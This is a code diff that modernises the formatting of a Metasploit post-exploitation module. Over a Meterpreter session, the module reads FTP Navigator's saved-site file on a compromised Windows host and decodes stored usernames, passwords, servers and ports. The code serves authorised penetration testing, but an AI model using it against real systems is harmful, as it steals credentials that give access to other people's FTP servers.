@@ -1,29 +1,37 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-require 'msf/core/auxiliary/report'
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Windows Gather FTP Navigator Saved Password Extraction',
-      'Description'    => %q{
-        This module extracts saved passwords from the FTP Navigator FTP client.
-        It will decode the saved passwords and store them in the database.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => ['theLightCosine'],
-      'Platform'       => [ 'win' ],
-      'SessionTypes'   => [ 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather FTP Navigator Saved Password Extraction',
+        'Description' => %q{
+          This module extracts saved passwords from the FTP Navigator FTP client.
+          It will decode the saved passwords and store them in the database.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['theLightCosine'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_channel_eof
+              core_channel_open
+              core_channel_read
+              core_channel_write
+            ]
+          }
+        }
+      )
+    )
   end
 
   def run
@@ -34,7 +42,7 @@ class Metasploit3 < Msf::Post
     path = "#{installdir}Ftplist.txt"
 
     begin
-      ftplist = client.fs.file.new(path,'r')
+      ftplist = client.fs.file.new(path, 'r')
     rescue Rex::Post::Meterpreter::RequestError => e
       print_error("Unable to open Ftplist.txt: #{e}")
       print_error("FTP Navigator May not Ne Installed")
@@ -46,10 +54,10 @@ class Metasploit3 < Msf::Post
       next if line.include? "Anonymous=1"
       next unless line.include? ";Password="
 
-      dpass    = ""
+      dpass = ""
       username = ""
-      server   = ""
-      port     = ""
+      server = ""
+      port = ""
 
       line.split(";").each do |field|
         next if field.include? "SavePassword"
@@ -97,7 +105,7 @@ class Metasploit3 < Msf::Post
   end
 
   def split_values(field)
-    values = field.split("=",2)
+    values = field.split("=", 2)
     return values[1]
   end
 
